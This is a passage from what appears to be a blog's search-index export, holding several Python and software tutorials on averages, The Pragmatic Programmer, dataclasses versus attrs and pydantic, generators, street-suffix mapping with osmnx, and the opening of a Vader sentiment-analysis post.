harmonic_mean ( dataset : typing . List ): return 1 / arithmetic_mean ( reciprocal_list ( dataset )) print ( f \"Harmonic Mean: { harmonic_mean ( dataset ) } \" ) plot_1d_data ( dataset , 5 ) plt . plot ( harmonic_mean ( dataset ), 5 , 'x' , color = 'red' , markersize = 50 ) plt . annotate ( 'Harmonic Mean' ,( harmonic_mean ( dataset ), 5 ),( harmonic_mean ( dataset ), 5.1 ), arrowprops = { 'width' : 0.1 }) Harmonic Mean: 15.05101860509987 Out[7]: Text(15.05101860509987, 5.1, 'Harmonic Mean') *{stroke-linecap:butt;stroke-linejoin:round;} In [8]: print ( f \"Mode: { statistics . mode ( dataset ) } \" ) print ( f \"Median: { statistics . median ( dataset ) } \" ) print ( f \"Arithmetic Mean: { arithmetic_mean ( dataset ) } \" ) print ( f \"Geometric Mean: { geometric_mean ( dataset ) } \" ) print ( f \"Harmonic Mean: { harmonic_mean ( dataset ) } \" ) Mode: 4 Median: 40.0 Arithmetic Mean: 47.02 Geometric Mean: 32.54181835292063 Harmonic Mean: 15.05101860509987 Thank you to Andrew Goodwin over on Twitter: https://twitter.com/ndrewg/status/1296773835585236997 for suggesting some extremely interesting further reading on Anscombe's Quartet and The Datasaurus Dozen , which are examples of why summary statistics matter of exactly the meaning of this post!","tags":"Data Science","url":"https://jackmckew.dev/types-of-averages-means.html","loc":"https://jackmckew.dev/types-of-averages-means.html"},{"title":"Book Review: The Pragmatic Programmer","text":"The Pragmatic Programmer is heiled as one of the must-reads for all developers and is extremely well known. It is comparable to a hand book full of tips and tricks to develop more robust software, and also introduces lots of concepts throughout that can be used to improve the development workflow as it evolves for projects. Thus here are my key takeaways, I strongly believe that this is a book you read once, learn a stack from and when you revisit it with more experience down the line, you'll learn even more. This review is based on the 20th anniversary edition of the book. Most of the points below relate to specific chapters/sections. Soft Skills While software development is a technical role, soft skills are still one of the most paramount traits in effective developers and working with others in any scenario. No matter what you do, if you are an effective communicator, this will make you much more valuable in any context. Skills for being an effective communicator include: Active Listening Collaboration Presentation of Ideas Teamwork Adaptability Conflict Resolution No Broken Windows The broken window theory is a criminological theory in that visible signs of damage create an environment that encourages further damage. If a street has a broken window, what's the big deal if another broken window happens, rinse and repeat until chaos. By ensuring that no broken windows are left in your designs, this encourages further quality contributions. Boiled Frogs If a team works without communication, it may be difficult to see that the entire project may be boiling over. By constant communication, responsibility and transparency throughout the team, this can be minimized. Each member should feel comfortable in raising possible issues with others, and likewise in receiving feedback. Know When to Stop Great software today is often preferable to perfect software tomorrow. When building software, it is often tempting to think gee this feature would be better if I just added this , then chasing that feature down a rabbit hole and suddenly the day is over. By doing this, it is potentially delaying the software from potentially being used by the end user. DRY Principle Don't repeat yourself. There are many ways information can be duplicated throughout a project, this presents a problem when you need to change that piece of information. By having a single, unambiguous representation means changes can be much more easily handled, and as we all know change is inevitable. There are multiple types of duplication: Imposed duplication - Developers feel they have no choiceâ€”the environment seems to require duplication. Inadvertent duplication - Developers don't realize that they are duplicating information. Impatient duplication - Developers get lazy and duplicate because it seems easier. Interdeveloper duplication - Multiple people on a team (or on different teams) duplicate a piece of information. Orthogonality Two or more things are orthogonal if changes in one don't affect the others. By writing orthogonal code & developing orthogonal systems, the benefits ripple throughout the entire project. Some of the benefits include: Changes are now localised Promotes reuse of existing code Allows for more combinations of existing modules Bugs are now contained & isolated Functionality can be divided for working with multiple teams Easier to test Tracer Design Whenever a project begins, knowing what it'll need to do and the requirements by the end of the project is extremely difficult to know; with change also being evitable the first thoughts for requirements may not be the same by the end. The name tracer design comes from tracer bullets, which are bullets used that light up so that the shooter can readjust their aim until they're on target; the same concept can be applied to design. This also brings the end-users into the design process by giving them early access to a working product. Some of the benefits include: Users get to see/use something early on Bugs and requirements can be captured earlier Developers get a structure to build upon Feel better for seeing progress Tracer design is different to prototyping, with prototyping a developer is exploring aspects on what may be in the final product. Tracer designs aims to have the code that is being develop be apart of the final product, essentially verifying that the product hangs together and runs as intended. Risk in Prototypes being Deployed When a prototype is presented to the end-user, there is potential for the user to believe it is almost finished or worse finished. Managing the expectations of your users or stakeholders comes back to Soft Skills , in that developers need to be effective communicators on informing that this is incomplete and there is much left to go! Crash Early By crashing early, it means the program does a lot less damage than a crippled program. This concept can be implemented by checking for the inverse of the requirement and erroring. By doing this, it means the code is more readable in finding the requirements that it must meet. It captures more potential issues before they cause damage versus checking all the ducks are lined up. For demonstrating this, we will use the example of a square root function. As we know, square root wants to have a positive number given to it (unless using complex numbers). 1 2 3 4 5 def sqrt ( value ): if value < 0 : raise ValueError ( \"Value must be positive to get the square root\" ) return value ** 0.5 By doing this, we enable the function to potentially raise an error, multiply by -1 or even append an i for complex numbers. Another example of this is, before querying a database check if there isn't a connection to the database and raise an error rather than checking if the connection is established (thus making for quite the nested beast sometimes). Design by Contract A correct program does no more and no less then what it claims to do. Ensure conditions (both pre & post) are met before anything begins, and promise as little as possible in return. This also helps enforcing Crash Early , by verifying conditions have been satisfied, enables developers to crash the program if anything is unsatisfactory. Build End to End There are many ways when it comes how something is built. More commonly things are viewed upon as being top-down or bottom-up. Top down is when we define the problem statement and break it down into smaller actionable chunks until it's pieced together. Bottom up is when we build more amd more of the smaller actionable pieces and plan to join them all together to meet the requirements in the future (very helpful when the problem isn't well defined). Rather than either of these, if we look through the perspective of building things end-to-end this can be a more holistic methodology. Which can also be adopted with either of the prior methodologies mentioned beforehand ensuring to build complete pipelines which can be combined or amended later on in development when the problem is further understood. Debugging Don't assume how a bug occurred, prove it. This is also a fantastic practice to tie in with testing, by discovering a bug, determine how it was created and then prove that's how the bug occurred. This brings the workflow into: Bug occurs Find out why/how the bug occurred Prove that's how it occurred Add it to the test suite to ensure the bug never occurs again (or is captured appropriately) Rename ASAP & Rename Well As a project changes, the intention behind the name of a variable/function may also change. It is important to ensure that naming conventions ensure that the intention behind the name matches the functionality. No one wants to have to explain to a new user why getData() actually writes data. Define Requirements with User Stories Rather than defining concrete technical requirements on how an application should behave and what outcomes are to be expected, developers can make the most of user stories to define the requirements. This puts the power in the hands of the developers to thoroughly understand and ask questions about how a story is to be completed. Typically written informally and from the perspective of the end user. Some examples include: As a user, I want to see other users progress, so I can understand where I'm at As a manager, I want to see the overall number of outstanding tasks, so I can allocate resources appropriately Project Glossary Along with naming things appropriately, chaos can ensue when meaning behind words are not the same across different people. Ensure to keep a project glossary around project specific words and their meaning to ensure that everyone in the project is on the same page.","tags":"Software","url":"https://jackmckew.dev/book-review-the-pragmatic-programmer.html","loc":"https://jackmckew.dev/book-review-the-pragmatic-programmer.html"},{"title":"Dataclasses vs Attrs vs Pydantic","text":"Python 3.7 introduced dataclasses, a handy decorator that can make creating classes so much easier and seamless. This post will go into comparing a regular class, a 'dataclass' and a class using attrs. Dataclasses were based on attrs, which is a python package that also aims to make creating classes a much more enjoyable experience. Dataclasses are included in the standard library (provided 3.7+), while to enable attrs, it must be installed with pip (eg, pip install attrs ). Mainly they are for automating the (sometimes) painful experience of writing dunder methods. You can read more about dunder methods in a prevous post here: https://jackmckew.dev/dunders-in-python.html Dataclasses vs Attrs vs Pydantic: Features Feature Dataclass Attrs Pydantic frozen âœ… âœ… âœ… defaults âœ… âœ… âœ… totuple âœ… âœ… âœ… todict âœ… âœ… âœ… validators âŒ âœ… âœ… converters âŒ âœ… âœ… slotted âŒ âœ… âŒ programmatic creation âŒ âœ… âŒ When to use Dataclasses Dataclasses are mainly about 'grouping' variables together. Choose dataclasses if: The main concern is around the type of the variable, not the value Adding another package dependancy isn't trivial When to use Attrs Attrs are about both grouping & validating. Choose attrs if: You're concerned around the performance (attrs supports slotted class generation which are optimized for CPython) When to use Pydantic Pydantic is about thorough data validation. Choose pydantic if: You want to validate the values inside each class You want to santise the input Example Class First off let's start with our example class in the default way that it would be implemented in Python. We will also use type hints in our class defintions, this is best practice for ensuring our variables are the type we intend them to be. Type hints are also integrated into attrs for creating classes. In [1]: import typing class Data : def __init__ ( self , x : float = None , y : float = None , kwargs : typing . Dict = None ): self . x = x self . y = y self . kwargs = kwargs The arguments passed to the __init__ constructor are duplicated when instantiating the parameters of the class with the same arguments. This wouldn't typically be the case if the arguments and the parameters don't match. Luckily this is something that both dataclasses and attrs can help with (which we'll see later on). Now to demonstrate all the different things that both dataclasses & attrs automates for us, let's define a function which takes in the class constructor and prints out all the different elements for each of our classes. In [2]: def class_tester ( class_constructor ): test_class_1 = class_constructor () test_class_2 = class_constructor () print ( f \"Repr/str dunder method representation: { test_class_1 } \" ) print ( f \"Equality dunder method (using ==) (should be True if implemented): { test_class_1 == test_class_2 } \" ) print ( f \"Equality dunder method (using is) (should be True if implemented): { test_class_1 is test_class_2 } \" ) class_tester ( Data ) Repr/str dunder method representation: <__main__.Data object at 0x00000269A5758A90> Equality dunder method (using ==) (should be True if implemented): False Equality dunder method (using is) (should be True if implemented): False Dataclasses Dataclasses by default automatically initialise a bunch of dunder methods for us in a class such as: __init__ The initialisation method for the class __repr__ How the class is represented with print() is called __str__ How the class is represented as a string (called with __repr__ ) __eq__ Used when equality operators are used (eg, == ) __hash__ The hash for the class (called with __eq__ ) There's also a stack of other dunder methods that can also be automated which are detailed at: https://docs.python.org/3/library/dataclasses.html Thank you to Michael Kosher over on Twitter: It's worth noting validation can be added to dataclasses using a __post_init hook. However, it's pretty low level relative to attrs/#pydantic. I did a similar comparison https://mpkocher.github.io/2019/05/22/Dataclasses-in-Python-3-7/ In [3]: from dataclasses import dataclass @dataclass class Data : x : float = None y : float = None kwargs : typing . Dict = None class_tester ( Data ) Repr/str dunder method representation: Data(x=None, y=None, kwargs=None) Equality dunder method (using ==) (should be True if implemented): True Equality dunder method (using is) (should be True if implemented): False Finally we have our attrs class, there is two main 'functions' apart of attrs which are attr.s and attr.ib() . attr.s is the decorator to put on a class to have the package initialise the dunder methods for us, while attr.ib() can be used (optional) for defining the parameters of the class. There is lots of optional arguments for both attr.s and attr.ib() , which documented at: https://www.attrs.org/en/stable/api.html . Mainly the optional arguments are for enabling/disabling the differing dunder methods in the class. In [4]: import attr @attr . s class Data : x : float = attr . ib ( default = None ) y : float = attr . ib ( default = None ) kwargs : typing . Dict = attr . ib ( default = None ) class_tester ( Data ) Repr/str dunder method representation: Data(x=None, y=None, kwargs=None) Equality dunder method (using ==) (should be True if implemented): True Equality dunder method (using is) (should be True if implemented): False Attrs Next let's dive into attrs Validators in attrs One major functionality that attrs has but dataclasses doesn't, is validators. This enables us to ensure that when our classes are being created that we validate the inputs to any specific values. Let's build an example that ensure our parameter x is greater than 42, and if not raise an error to the user. In [5]: import attr @attr . s class ValidatedData : x : float = attr . ib ( default = None , validator = attr . validators . instance_of ( int )) y : float = attr . ib ( default = None ) kwargs : typing . Dict = attr . ib ( default = None ) @x . validator def more_than_the_meaning_of_life ( self , attribute , value ): if not value >= 42 : raise ValueError ( \"Must be more than the meaning of life!\" ) test_data_point_1 = ValidatedData ( 42 ) test_data_point_2 = ValidatedData ( - 35 ) --------------------------------------------------------------------------- ValueError Traceback (most recent call last) <ipython-input-5-1f0c941b3dd2> in <module> 14 test_data_point_1 = ValidatedData ( 42 ) 15 ---> 16 test_data_point_2 = ValidatedData ( - 35 ) <attrs generated init __main__.ValidatedData> in __init__ (self, x, y, kwargs) 4 self . kwargs = kwargs 5 if _config . _run_validators is True : ----> 6 __attr_validator_x ( self , __attr_x , self . x ) c:\\Users\\jackm\\Documents\\GitHub\\jackmckew.dev\\drafts\\2020\\dataclasses-vs-attrs\\.env\\lib\\site-packages\\attr\\_make.py in __call__ (self, inst, attr, value) 2144 def __call__ ( self , inst , attr , value ) : 2145 for v in self . _validators : -> 2146 v ( inst , attr , value ) 2147 2148 <ipython-input-5-1f0c941b3dd2> in more_than_the_meaning_of_life (self, attribute, value) 10 def more_than_the_meaning_of_life ( self , attribute , value ) : 11 if not value >= 42 : ---> 12 raise ValueError ( \"Must be more than the meaning of life!\" ) 13 14 test_data_point_1 = ValidatedData ( 42 ) ValueError : Must be more than the meaning of life! Converters in Attrs Converters are used for the sanitisation of the input data when creating classes. If we want to support our users to create our parameters which are intended to be integers, we can santise this input with converters. This let's our classes be much more flexible with our users while still keeping stability in the typing behind the parameters. In [6]: import attr @attr . s class ConvertedData : x : float = attr . ib ( default = None , converter = int ) y : float = attr . ib ( default = None ) kwargs : typing . Dict = attr . ib ( default = None ) @x . validator def more_than_the_meaning_of_life ( self , attribute , value ): if not value >= 42 : raise ValueError ( \"Must be more than the meaning of life!\" ) test_data_point_1 = ConvertedData ( 42 ) print ( test_data_point_1 ) test_data_point_2 = ConvertedData ( \"42\" ) print ( test_data_point_2 ) ConvertedData(x=42, y=None, kwargs=None) ConvertedData(x=42, y=None, kwargs=None) Programmatic Creation of Attrs In some cases you may want to create classes programmatically, well attrs doesn't let us down and provides a method for us! We can easily just pass a dictionary of all the parameters we need. In [7]: ProgrammaticData = attr . make_class ( \"Data\" , { 'x' : attr . ib ( default = None ), 'y' : attr . ib ( default = None ), 'kwargs' : attr . ib ( default = None )} ) print ( Data ()) print ( ProgrammaticData ()) Data(x=None, y=None, kwargs=None) Data(x=None, y=None, kwargs=None) PyDantic Dataclasses Pydantic is a python package for data validation and settings management using python type annotations. Perfect, this is what we were trying to do with dataclasses and attrs. Even more so pydantic provides a dataclass decorator to enable data validation on our dataclasses. This enables us to create extensible classes with data validation even easier than attrs ! The biggest benefit here, is now, by default the type annotations are enforced at runtime and any invalid data raises a nicely formatted error. In [8]: from pydantic.dataclasses import dataclass import typing @dataclass class Data : x : float = None y : float = None kwargs : typing . Dict = None class_tester ( Data ) Repr/str dunder method representation: Data(x=None, y=None, kwargs=None) Equality dunder method (using ==) (should be True if implemented): True Equality dunder method (using is) (should be True if implemented): False pydantic also automatically implements conversion & data validation, let's test this out. In [9]: test_data_point = Data ( x = '123' ) print ( test_data_point ) Data ( x = 't' ) Data(x=123.0, y=None, kwargs=None) --------------------------------------------------------------------------- ValidationError Traceback (most recent call last) <ipython-input-9-67163ff1f554> in <module> 1 test_data_point = Data ( x = '123' ) 2 print ( test_data_point ) ----> 3 Data ( x = 't' ) <string> in __init__ (self, x, y, kwargs) c:\\Users\\jackm\\Documents\\GitHub\\jackmckew.dev\\drafts\\2020\\dataclasses-vs-attrs\\.env\\lib\\site-packages\\pydantic\\dataclasses.cp38-win_amd64.pyd in pydantic.dataclasses._process_class._pydantic_post_init () ValidationError : 1 validation error for Data x value is not a valid float (type=type_error.float) As we can see above, it gives the developers a nicely formatted error message when the data validation failed, and smoothly sanitises the input when it needs to.","tags":"Data Science","url":"https://jackmckew.dev/dataclasses-vs-attrs-vs-pydantic.html","loc":"https://jackmckew.dev/dataclasses-vs-attrs-vs-pydantic.html"},{"title":"Generators in Python","text":"Generators are a special type of function in python, letting you 'lazy load' data; a function becomes a generator is with the yield statement. Lazy loading is when you access just a portion of a data set that you are interested in (eg, the part you are working with), as opposed to loading the entire data set. While this gives marginal increases in efficiency/speed with small data sets, it can provide dramatic improvements on larger data sets; especially if you are using a system with limited memory. Before we dive into some examples on where you could use generators, let's look where you should not use generators: the data needs to be accessed multiple times (eg, join ) need to access the data randomly (or any other method of access that's not forward) using a different compiler Some examples where you should use generators are: you don't know if you'll need all the results you don't want to allocate all the results into memory you don't know how many results there may be (eg, user interaction) a potentially infinite series A great example use is that of a search, it could be implemented to gather all the elements to search and return them after the search is complete. Rather by using a generator you can return the results as they are found! First off, let's start with the hello world of generators, the fibonacci sequence. If you don't know what the fibonacci sequence is, it's just adding the number that precedes itself and so on (eg, 1,1,2,3,5,8,etc), this is an infinite series. In [1]: def fibon ( n ): \"Generator version\" a = b = 1 for i in range ( n ): yield a a , b = b , a + b for x in fibon ( 10 ): print ( x ) 1 1 2 3 5 8 13 21 34 55 You can also generate the entire sequence into memory by using the list function on the generator function! In [2]: print ( list ( fibon ( 10 ))) [1, 1, 2, 3, 5, 8, 13, 21, 34, 55] If we were to use a function for this instead, which compiles the entire list of the fibonacci sequence before returning, this would mean fibon(number_of_elements) would need to be computed and stored in memory. By using generators we can provide fibon(number_of_elements) any number of elements and only the latest and it's preceding value are stored in memory. Now imagine if you had a database with 100 million records, and you needed to calculate something for every single row. If you tried to retrieve the entire database and store it in memory, it would possibly just fall over. Rather by using a generator we can iterate through the database in smaller chunks. Another handy feature is to have separate generator instances which you can interweave throughout your project if you need to maintain multiple states in a simplistic manner. In this example, the entire 'data set' is stored in memory, but in a real use we'd request the small chunk from a database The generator function returns a generator object, so to get each 'iteration' we use the next function. In [3]: def load_big_data (): return range ( 100 ) def batch_process ( chunksize ): from itertools import zip_longest def grouper ( n , iterable , fillvalue = None ): args = [ iter ( iterable )] * n return zip_longest ( fillvalue = fillvalue , * args ) # While big_data is currently stored entirely in memory, if you are requesting from an external database you could just fetch n results data = load_big_data () for i in grouper ( chunksize , data ): yield list ( i ) batch_processor_1 = batch_process ( 5 ) batch_processor_2 = batch_process ( 3 ) print ( next ( batch_processor_1 )) print ( next ( batch_processor_1 )) print ( next ( batch_processor_2 )) print ( next ( batch_processor_1 )) [0, 1, 2, 3, 4] [5, 6, 7, 8, 9] [0, 1, 2] [10, 11, 12, 13, 14] Another good example is to use generators for user interaction (UI), where the program is waiting on the user to input something, but you don't know how long the program will have to wait for interaction. This enables the program to run until the user decides to close it. In [4]: def user_input (): while True : cmd = input () yield cmd for command in user_input (): # Do something with command print ( command ) hello computer i am user --------------------------------------------------------------------------- KeyboardInterrupt Traceback (most recent call last) <ipython-input-4-3e09f71ee7b6> in <module> 4 yield cmd 5 ----> 6 for command in user_input ( ) : 7 # Do something with command 8 print ( command ) <ipython-input-4-3e09f71ee7b6> in user_input () 1 def user_input ( ) : 2 while True : ----> 3 cmd = input ( ) 4 yield cmd 5 c:\\Users\\jackm\\Documents\\GitHub\\jackmckew.dev\\drafts\\2020\\generators-in-python\\.env\\lib\\site-packages\\ipykernel\\kernelbase.py in raw_input (self, prompt) 858 \"raw_input was called, but this frontend does not support input requests.\" 859 ) --> 860 return self._input_request(str(prompt), 861 self . _parent_ident , 862 self . _parent_header , c:\\Users\\jackm\\Documents\\GitHub\\jackmckew.dev\\drafts\\2020\\generators-in-python\\.env\\lib\\site-packages\\ipykernel\\kernelbase.py in _input_request (self, prompt, ident, parent, password) 902 except KeyboardInterrupt : 903 # re-raise KeyboardInterrupt, to truncate traceback --> 904 raise KeyboardInterrupt ( \"Interrupted by user\" ) from None 905 except Exception as e : 906 self . log . warning ( \"Invalid Message:\" , exc_info = True ) KeyboardInterrupt : Interrupted by user","tags":"Data Science","url":"https://jackmckew.dev/generators-in-python.html","loc":"https://jackmckew.dev/generators-in-python.html"},{"title":"Street Suffix Analysis & Colouring with Python","text":"Street Suffix Visualisation with Python Ever thought about how roads and streets are named where you live? How many are roads versus how many are streets? Is there a specific pattern to it where you live or is it just random? This post is going to go into how to visualise this using Python, and in particular osmnx . To understand what the terms are in the naming convention, here's an excerpt from a blog post over at: https://360.here.com/2016/12/30/whats-the-difference-between-a-road-a-street-and-an-avenue/ So a 'road' is anything that connects two points, while 'streets' are public ways which have buildings on either side. Avenues, meanwhile, have the same attributes as streets but run perpendicular to them, while a boulevard is essentially a wide street (or avenue), with a median through the middle. A lane is, predictably, smaller. Some of the fantastic resources used in creating this post are: https://towardsdatascience.com/retrieving-openstreetmap-data-in-python-1777a4be45bb https://geopandas.org/reference.html#geodataframe https://osmnx.readthedocs.io/en/stable/index.html Let's get started, always beginning by importing the necessary packages. This environment was created using Anaconda, as setting up GDAL for Windows can be painful at the best of time, and Anaconda automates this process for us. This stackoverflow question also helped with setting up https://stackoverflow.com/questions/59802791/installing-osmnx-with-anaconda . Note that we set up the format for matplotlib as svg, as this will help out for our plots in this case. Svg is a file format which is a vector graphic. This means that everything in the 'image' is drawn mathematically allowing for 'infinite' resolution. In [1]: import osmnx as ox ox . config ( log_console = True , use_cache = True ) import matplotlib.pyplot as plt from IPython.display import set_matplotlib_formats import pandas as pd import seaborn as sns % matplotlib inline set_matplotlib_formats ( 'svg' ) ox . __version__ Out[1]: '0.14.0' osmnx allows us to access the plethora of data that is OpenStreetMap. OpenStreetMap is a map of the world, created by people like you and free to use under an open license. OpenStreetMap contains data on streets, buildings, elevations, terrain and more. osmnx can extract this data in a variety of methods, the main one we are interested in is the graph representation of the data (which is used for the streets). We extract the data for our area by providing an address, filter by the type of network ('drive' in this case) and providing a specific distance away from this address. We plot this data to see the extent of the extracted data. In [2]: address = \"Beach Rd, Redhead NSW 2290, Australia\" graph = ox . graph_from_address ( address , network_type = 'drive' , dist = 5000 ) fig , ax = ox . plot_graph ( graph ) plt . tight_layout () *{stroke-linecap:butt;stroke-linejoin:round;} <Figure size 432x288 with 0 Axes> Next we need to query & analyse this data, which osmnx conveniently provides us with a function to convert the extracted graph into a GeoDataFrame . In [3]: nodes , streets = ox . graph_to_gdfs ( graph ) display ( streets ) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } u v key osmid highway name maxspeed oneway length geometry junction lanes ref width bridge access 0 4812701696 4812701699 0 488979392 residential Callemonda Close 50 False 89.588 LINESTRING (151.68153 -33.01304, 151.68144 -33... NaN NaN NaN NaN NaN NaN 1 4812701699 1844333226 0 172707768 tertiary Dalrymple Street 50 False 91.022 LINESTRING (151.68130 -33.01380, 151.68228 -33... NaN NaN NaN NaN NaN NaN 2 4812701699 1844333215 0 172707768 tertiary Dalrymple Street 50 False 162.463 LINESTRING (151.68130 -33.01380, 151.68105 -33... NaN NaN NaN NaN NaN NaN 3 4812701699 4812701696 0 488979392 residential Callemonda Close 50 False 89.588 LINESTRING (151.68130 -33.01380, 151.68138 -33... NaN NaN NaN NaN NaN NaN 4 4812701700 4812701707 0 488979393 residential Twin View Court 50 False 78.934 LINESTRING (151.67519 -33.01230, 151.67523 -33... NaN NaN NaN NaN NaN NaN ... ... ... ... ... ... ... ... ... ... ... ... ... ... ... ... ... 2733 1847021562 1847021587 0 173954199 residential Boldon Close 50 False 112.986 LINESTRING (151.68051 -32.97493, 151.68038 -32... NaN NaN NaN NaN NaN NaN 2734 1847021565 1847021545 0 418259583 tertiary_link Algona Road 60 False 131.581 LINESTRING (151.69368 -32.97523, 151.69442 -32... NaN NaN NaN NaN NaN NaN 2735 1847021565 2157256210 0 254493907 residential Lees Street 50 False 342.531 LINESTRING (151.69368 -32.97523, 151.69353 -32... NaN NaN NaN NaN NaN NaN 2736 1847021565 1847021576 0 418259583 tertiary_link Algona Road 60 False 37.266 LINESTRING (151.69368 -32.97523, 151.69365 -32... NaN NaN NaN NaN NaN NaN 2737 1847021566 1847021583 0 173954217 residential Church Street 50 False 52.110 LINESTRING (151.68817 -32.97526, 151.68808 -32... NaN NaN NaN NaN NaN NaN 2738 rows Ã— 16 columns To query the dataset for the road type, we need to extract this from the roads name. For some roads in the dataset, multiple road names are provided so we just take the first in this case and drop all roads without a name. To get the last word in the road name, we split the string by spaces into a list and then take the last element in the list. In [4]: def get_road_type ( street_name ): if isinstance ( street_name , list ): street_name = street_name [ 0 ] return street_name . split ()[ - 1 ] streets = streets [ streets [ 'name' ] . notna ()] streets [ 'street_type' ] = streets [ 'name' ] . apply ( get_road_type ) display ( streets ) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } u v key osmid highway name maxspeed oneway length geometry junction lanes ref width bridge access street_type 0 4812701696 4812701699 0 488979392 residential Callemonda Close 50 False 89.588 LINESTRING (151.68153 -33.01304, 151.68144 -33... NaN NaN NaN NaN NaN NaN Close 1 4812701699 1844333226 0 172707768 tertiary Dalrymple Street 50 False 91.022 LINESTRING (151.68130 -33.01380, 151.68228 -33... NaN NaN NaN NaN NaN NaN Street 2 4812701699 1844333215 0 172707768 tertiary Dalrymple Street 50 False 162.463 LINESTRING (151.68130 -33.01380, 151.68105 -33... NaN NaN NaN NaN NaN NaN Street 3 4812701699 4812701696 0 488979392 residential Callemonda Close 50 False 89.588 LINESTRING (151.68130 -33.01380, 151.68138 -33... NaN NaN NaN NaN NaN NaN Close 4 4812701700 4812701707 0 488979393 residential Twin View Court 50 False 78.934 LINESTRING (151.67519 -33.01230, 151.67523 -33... NaN NaN NaN NaN NaN NaN Court ... ... ... ... ... ... ... ... ... ... ... ... ... ... ... ... ... ... 2733 1847021562 1847021587 0 173954199 residential Boldon Close 50 False 112.986 LINESTRING (151.68051 -32.97493, 151.68038 -32... NaN NaN NaN NaN NaN NaN Close 2734 1847021565 1847021545 0 418259583 tertiary_link Algona Road 60 False 131.581 LINESTRING (151.69368 -32.97523, 151.69442 -32... NaN NaN NaN NaN NaN NaN Road 2735 1847021565 2157256210 0 254493907 residential Lees Street 50 False 342.531 LINESTRING (151.69368 -32.97523, 151.69353 -32... NaN NaN NaN NaN NaN NaN Street 2736 1847021565 1847021576 0 418259583 tertiary_link Algona Road 60 False 37.266 LINESTRING (151.69368 -32.97523, 151.69365 -32... NaN NaN NaN NaN NaN NaN Road 2737 1847021566 1847021583 0 173954217 residential Church Street 50 False 52.110 LINESTRING (151.68817 -32.97526, 151.68808 -32... NaN NaN NaN NaN NaN NaN Street 2662 rows Ã— 17 columns Finally time to plot! Since the legend in this case can potentially be very large, we provide some specifics on locating the legend. In [5]: ax = streets . plot ( column = 'street_type' , legend = True , legend_kwds = { 'bbox_to_anchor' :( 0.5 , - 0.05 ), 'shadow' : True , 'ncol' : 3 , 'loc' : 'upper center' }) ax . axis ( 'off' ) fig = ax . get_figure () fig . savefig ( 'street_type_map.svg' , bbox_inches = 'tight' ) *{stroke-linecap:butt;stroke-linejoin:round;} Interestingly the connections between the suburbs and the main distributors within the suburbs are all roads. While all the networks inside the suburbs are streets, and the highways/bypass stand out well and truly. Now let's find the distribution of types of streets in our dataset. In [8]: streets = streets . astype ( str ) . drop_duplicates ([ 'name' ]) street_types = pd . DataFrame ( streets [ \"street_type\" ] . apply ( pd . Series )[ 0 ] . value_counts () . reset_index ()) street_types . columns = [ \"type\" , \"count\" ] fig , ax = plt . subplots ( figsize = ( 12 , 10 )) sns . barplot ( y = \"type\" , x = \"count\" , data = street_types , ax = ax ) plt . tight_layout () plt . savefig ( \"street_type_bar_chart.svg\" ) *{stroke-linecap:butt;stroke-linejoin:round;} There was a lot more 'closes' than I expected, but interesting nonetheless. You can run this analysis yourself on wherever you'd like, change the address & distance and re-run this notebook! In [ ]:","tags":"Data Science","url":"https://jackmckew.dev/street-suffix-analysis-colouring-with-python.html","loc":"https://jackmckew.dev/street-suffix-analysis-colouring-with-python.html"},{"title":"Sentiment Analysis & Text Cleaning in Python with Vader","text":"Sentiment Analysis in Python with Vader Sentiment analysis is the interpretation and classification of emotions (positive, negative and neutral) within text data using text analysis techniques. Essentially just trying to judge the amount of emotion from the written words & determine what type of emotion. This post we'll go into how to do this with Python and specifically the package Vader https://github.com/cjhutto/vaderSentiment . This post comes from a recent research project I helped out with the University of San Diego for investigating the sentiment of Twitter users in Italy during the pandemic against when the policy changes were enacted (eg, Lockdowns, etc). Sentiment analysis was the step after translating the data, which was detailed on a previous post: https://jackmckew.dev/translating-text-in-python.html . Find the full source code for the research project at: https://github.com/HDMA-SDSU/Translate-Tweets As always, first we set up the virtual environment, install any necessary packages and import them. In this post we'll make use of: nltk pandas vader wordcloud We also prepare a few datasets to use later on, stopwords & wordnet. Stop words are words which in English add no meaning to the rest of the setence, for example, the words like the, he, have etc. All these stopwords can be ignored without ruining the meaning of the sentence; although when using pre-computed sentiment analysis libraries removing these words may be of detriment to the determined scores. Wordnet is used later on for lemmatization (aka stemming), which is the process of bringing words down to their 'root' word. For example, the words car, cars, car's, cars' all share the common 'root' word, car . Note that this can also be of detriment when using pre-computer sentiment analysis libraries. In [1]: import pandas as pd import nltk import typing import matplotlib.pyplot as plt nltk . download ( 'stopwords' ) nltk . download ( 'wordnet' ) [nltk_data] Downloading package stopwords to [nltk_data] C:\\Users\\jackm\\AppData\\Roaming\\nltk_data... [nltk_data] Package stopwords is already up-to-date! [nltk_data] Downloading package wordnet to [nltk_data] C:\\Users\\jackm\\AppData\\Roaming\\nltk_data... [nltk_data] Package wordnet is already up-to-date! Out[1]: True Next up we need a dataset that we can run the sentimment analysis on, for this we use a dataset offered by a stanford course ( https://nlp.stanford.edu/sentiment/code.html ) which contains ~10,000 rotten tomato reviews (a movie review website). Let's try and find the top positive & negative reviews in this dataset with vader. In [2]: # Read in data here # https://nlp.stanford.edu/sentiment/code.html text_data = pd . read_table ( 'original_rt_snippets.txt' , header = None ) display ( text_data . sample ( 5 )) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } 0 1493 This remake gets all there is to get out of a ... 1209 As a first-time director, Paxton has tapped so... 6536 The story has its redundancies, and the young ... 1435 If you're in the mood for a Bollywood film, he... 3691 Death to Smoochy is often very funny, but what... Now that we've downloaded the stopword dataset previously, let's take a look at whats inside it. In [3]: # Import english stop words from nltk.corpus import stopwords stopcorpus : typing . List = stopwords . words ( 'english' ) print ( stopcorpus ) ['i', 'me', 'my', 'myself', 'we', 'our', 'ours', 'ourselves', 'you', \"you're\", \"you've\", \"you'll\", \"you'd\", 'your', 'yours', 'yourself', 'yourselves', 'he', 'him', 'his', 'himself', 'she', \"she's\", 'her', 'hers', 'herself', 'it', \"it's\", 'its', 'itself', 'they', 'them', 'their', 'theirs', 'themselves', 'what', 'which', 'who', 'whom', 'this', 'that', \"that'll\", 'these', 'those', 'am', 'is', 'are', 'was', 'were', 'be', 'been', 'being', 'have', 'has', 'had', 'having', 'do', 'does', 'did', 'doing', 'a', 'an', 'the', 'and', 'but', 'if', 'or', 'because', 'as', 'until', 'while', 'of', 'at', 'by', 'for', 'with', 